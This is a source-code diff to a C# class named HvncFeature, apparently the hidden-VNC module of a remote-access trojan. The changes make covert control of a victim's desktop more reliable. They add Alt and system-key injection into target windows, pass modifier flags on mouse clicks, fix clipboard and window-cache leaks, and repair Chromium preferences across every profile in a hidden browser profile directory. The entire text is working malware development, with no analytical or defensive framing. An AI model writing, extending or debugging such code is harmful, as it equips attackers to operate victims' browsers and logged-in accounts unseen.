@@ -31,6 +31,9 @@ internal static class HvncFeature
     private const uint WM_KEYDOWN     = 0x0100;
     private const uint WM_KEYUP       = 0x0101;
     private const uint WM_CHAR        = 0x0102;
+    private const uint WM_SYSKEYDOWN  = 0x0104;
+    private const uint WM_SYSKEYUP    = 0x0105;
+    private const uint KF_ALTDOWN     = 0x20000000; // lParam bit 29 — context code for SYSKEY messages
     private const uint WM_NCHITTEST   = 0x0084;
     private const uint WM_SYSCOMMAND    = 0x0112;
     private const uint WM_CLOSE         = 0x0010;
@@ -420,8 +423,10 @@ internal static class HvncFeature
             // Do NOT call CloseDesktop/GdiplusShutdown under a live thread (UB / crash).
             // Zero ALL composite + desktop fields so Start() allocates fresh resources.
             FreeWinCache();
-            _hDesktop = 0; _gdipToken = 0; _h264Enc = null;
-            _compHdcRef = 0; _compHdc = 0; _compHbm = 0; _compBits = 0;
+            _h264Enc?.Dispose(); _h264Enc = null;
+            if (_compHdcRef != 0) { ReleaseDC(0, _compHdcRef); _compHdcRef = 0; }
+            _hDesktop = 0; _gdipToken = 0;
+            _compHdc = 0; _compHbm = 0; _compBits = 0;
             _compW = 0; _compH = 0;
         }
 
@@ -533,8 +538,8 @@ internal static class HvncFeature
                     Buffer.MemoryCopy(pSrc, (void*)ptr, charCount * 2, text.Length * 2);
                 *(short*)((byte*)ptr + text.Length * 2) = 0;
                 GlobalUnlock(hMem);
-                SetClipboardData(13 /*CF_UNICODETEXT*/, hMem);
-                ok = true;
+                if (SetClipboardData(13 /*CF_UNICODETEXT*/, hMem) != 0) ok = true;
+                else GlobalFree(hMem); // SetClipboardData failed — we must free the memory
             }
             else { GlobalFree(hMem); }
         }
@@ -803,7 +808,7 @@ internal static class HvncFeature
     {
         if (_winCache.TryGetValue(hwnd, out var e) && e.W == w && e.H == h)
             return e;
-        if (e != null) FreeCacheEntry(e);
+        if (e != null) { FreeCacheEntry(e); _winCache.Remove(hwnd); } // remove stale entry before any fallible alloc
         nint hdc = CreateCompatibleDC(_compHdcRef);
         if (hdc == 0) return null;
         var bmi = MakeBmi(w, h);
@@ -1249,14 +1254,16 @@ internal static class HvncFeature
                 // Send only WM_RBUTTONDOWN/WM_RBUTTONUP — the window's DefWindowProc generates
                 // WM_CONTEXTMENU from WM_RBUTTONUP automatically. Posting it explicitly caused
                 // two menus to open, the second instantly dismissing the first.
+                uint rmkeys = (_leftButtonDown ? MK_LBUTTON : 0u) | (_shiftDown ? 0x0004u : 0u) | (_ctrlDown ? 0x0008u : 0u);
                 PostMessage(hwnd, down ? WM_RBUTTONDOWN : WM_RBUTTONUP,
-                            down ? (nint)MK_RBUTTON : 0, lParam);
+                            down ? (nint)(MK_RBUTTON | rmkeys) : (nint)rmkeys, lParam);
                 break;
             }
             default: // Middle — server sends button=2
             {
+                uint mmkeys = (_leftButtonDown ? MK_LBUTTON : 0u) | (_shiftDown ? 0x0004u : 0u) | (_ctrlDown ? 0x0008u : 0u);
                 PostMessage(hwnd, down ? WM_MBUTTONDOWN : WM_MBUTTONUP,
-                            down ? (nint)MK_MBUTTON : 0, lParam);
+                            down ? (nint)(MK_MBUTTON | mmkeys) : (nint)mmkeys, lParam);
                 break;
             }
         }
@@ -1313,14 +1320,27 @@ internal static class HvncFeature
         nint lpDn = (nint)(1u | (scan << 16) | (isExtKey ? KF_EXTENDED : 0u));
         nint lpUp = unchecked((nint)(0xC0000001u | (scan << 16) | (isExtKey ? KF_EXTENDED : 0u)));
 
-        // Modifier keys: send WM_KEYDOWN/WM_KEYUP so the target thread's GetKeyState is updated.
-        // Windows apps check GetKeyState(VK_CONTROL) when processing VK_A — they see it as pressed
-        // only if WM_KEYDOWN(VK_CONTROL) was previously dequeued by that same thread. This is
-        // required for Ctrl+A (select all), Ctrl+C, Ctrl+Z, etc. to work in Explorer, browsers, etc.
+        // Modifier keys: VK_MENU (Alt) → WM_SYSKEYDOWN (down) / WM_KEYUP (up) per Windows spec.
+        // Other modifiers (Shift, Ctrl, CapsLock) → WM_KEYDOWN/WM_KEYUP so target thread's GetKeyState updates.
+        bool isAltKey  = vk is 0x12 or 0xA4 or 0xA5;
         bool isModifier = vk is 0x10 or 0xA0 or 0xA1 or 0x11 or 0xA2 or 0xA3 or 0x12 or 0xA4 or 0xA5 or 0x14;
         if (isModifier)
         {
-            PostMessage(hwnd, down ? WM_KEYDOWN : WM_KEYUP, (nint)vk, down ? lpDn : lpUp);
+            // Alt key down uses WM_SYSKEYDOWN; Alt key up (and all other modifiers) use normal KEYDOWN/UP.
+            uint msg = (isAltKey && down) ? WM_SYSKEYDOWN : (down ? WM_KEYDOWN : WM_KEYUP);
+            PostMessage(hwnd, msg, (nint)vk, down ? lpDn : lpUp);
+            return;
+        }
+
+        // Alt+key: use WM_SYSKEYDOWN/WM_SYSKEYUP with KF_ALTDOWN in lParam.
+        // This is how Alt+F4 (close), Alt+Enter (fullscreen), Alt+D (address bar), etc. work.
+        // F10 alone also generates WM_SYSKEYDOWN regardless of Alt state.
+        bool needsSysKey = _altDown || vk == 0x79; // 0x79 = VK_F10
+        if (needsSysKey)
+        {
+            nint sysDn = lpDn | (nint)KF_ALTDOWN;
+            nint sysUp = lpUp | (nint)KF_ALTDOWN;
+            PostMessage(hwnd, down ? WM_SYSKEYDOWN : WM_SYSKEYUP, (nint)vk, down ? sysDn : sysUp);
             return;
         }
 
@@ -1348,7 +1368,7 @@ internal static class HvncFeature
             }
         }
 
-        // All other keys: WM_KEYDOWN/WM_KEYUP (Delete, Enter, arrows, F-keys, Ctrl+non-letter…)
+        // All other keys: WM_KEYDOWN/WM_KEYUP (Delete, Enter, arrows, non-letter Ctrl combos…)
         PostMessage(hwnd, down ? WM_KEYDOWN : WM_KEYUP, (nint)vk, down ? lpDn : lpUp);
     }
 
@@ -1431,7 +1451,7 @@ internal static class HvncFeature
         int cy     = GetSystemMetrics(4);  // SM_CYCAPTION
         int btnW   = cy * 2;               // ≈46px at 100% DPI
         int barTop = wr.top;
-        int barBot = wr.top + cy * 2 + border;
+        int barBot = wr.top + cy + border;
         if (y < barTop || y > barBot) return HTCAPTION;
         if (x < wr.left || x > wr.right) return HTCAPTION;
         if (x >= wr.right - btnW)     return HTCLOSE;
@@ -1656,8 +1676,9 @@ internal static class HvncFeature
         {
             foreach (var name in new[] { "SingletonLock", "SingletonSocket", "SingletonCookie" })
                 try { File.Delete(Path.Combine(dir, name)); } catch { }
-            // Also repair any corrupted Preferences in the HVNC temp profile
-            RepairChromiumJsonFile(Path.Combine(dir, "Default", "Preferences"));
+            // Repair corrupted Preferences in all profile subdirectories (Default + Profile 1, 2…)
+            foreach (var sub in Directory.EnumerateDirectories(dir))
+                RepairChromiumJsonFile(Path.Combine(sub, "Preferences"));
             RepairChromiumJsonFile(Path.Combine(dir, "Local State"));
         }
     }
